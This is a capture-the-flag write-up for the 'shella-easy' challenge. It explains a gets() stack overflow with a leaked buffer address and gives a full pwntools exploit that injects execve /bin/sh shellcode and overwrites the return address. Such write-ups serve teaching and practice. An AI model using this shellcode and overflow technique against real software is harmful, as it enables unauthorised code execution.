**This is a writeup for tu18 shellaeasy challenge**

Let's take a look at the main function:
```
void main(void) {
    char input [64];
    int check;
    setvbuf(_stdout,(char *)0x0,2,0x14);
    setvbuf(_stdin,(char *)0x0,2,0x14);
    check = -0x35014542;
    printf("Yeah I\'ll have a %p with a side of fries thanks\n", input);
    gets(input);
    if(check != -0x21524111) {
        exit(0);
    }
    return 0;
}
```

From this main function we can see that we have an input buffer that has a sapce of 64 bytes.
We also have a check variable that is set to some hex value.

Now the program uses a print statement and in that print statement it leaks the address of the input buffer which will be important to use later. To get this address we will run the code:
```
r.recvuntil(b"Yeah I\'ll have a ")
BUFF_ADDR = int(r.recvuntil(b" with a side of fries thanks", drop=True), 16)
```

The next thing this program does is call the get function. This will be our bug in the program since the get function takes any input length meaning we can put more input than our buffer can handle.

Lastly, our check value needs to be equal to 0xdeadbeef in order to reach the return address.

So how will we get the flag? We will write shellcode into our input buffer. After that is done, we will use our leaked address and overwrite the return address with that leaked address. That is because when we reach the return, it will set the EIP to the address of the input buffer and will execute the shellcode that was written into the buffer.

So lets take a look at the stack so we can see how our payload will be setup.
```
<RETURN>
Stack[-0x8]:4 local_8
Stack[-0xc]:4 check
Stack[-0x4c]:64 input
```

We need to get the offset between our input buffer and our check variable. We can do that by doing 0x4c - 0xc = (16 * 4 + 12) - 12 = 64

Now that we know the offset, we need to  add the shellcode into our payload. We can do this by using this code:
```
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = shellcode
```

Since the shellcode won't fill up the buffer all of the way, we need to do some quick math to fill up the remaining space in the input address. We can do that by adding this code to our payload:
```
payload += b"0" * (0x40 - len(shellcode))
```

Now that we filled up the entire input buffer, we have now reached the check variable which means we can overwrite the check varaible to make it equal to deadbeef so we can pass the check in the if statement.
We can do this by adding this code to our payload:
```
payload += p32(0xdeadbeef)
```

Let's look back at the stack, we can see that we still have this remaining before we reach the return address:
```
Stack[-0x8]:4 local_8
```

That means we need to add 8 more bytes into our payload so that we can reach the return address. We can do that by adding this code:
```
payload += b"0" * 8
```

Now that we have reached the return address, we can use the leaked address that we captured earlier and rewrite the return address with that. When we do that, the EIP will be set to that address and will execute the shell code that we loaded into that buffer.
We need to add this code to our payload:
```
payload += p32(BUFF_ADDR)
```

Our entire payload will look like this
```
payload = shellcode + b"0" * (0x40 - len(shellcode)) + p32(0xdeadbeef) + b"0" * 8 + p32(BUFF_ADDR)
```

**Final Exploit**
```
from pwn import *

BINARY = "./shella-easy"
elf = ELF(BINARY)
context.binary = elf
r = process(BINARY)

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
OFFSET = 0x40
TARGET_VALUE = 0xdeadbeef

r.recvuntil(b"Yeah I\'ll have a ")
BUFF_ADDR = int(r.recvuntil(b" with a side of fries thanks", drop=True), 16)
payload = shellcode + b"0" * (OFFSET - len(shellcode)) + p32(TARGET_VALUE) + b"0" * 8 + p32(BUFF_ADDR)
r.sendline(payload)
r.interactive()
```




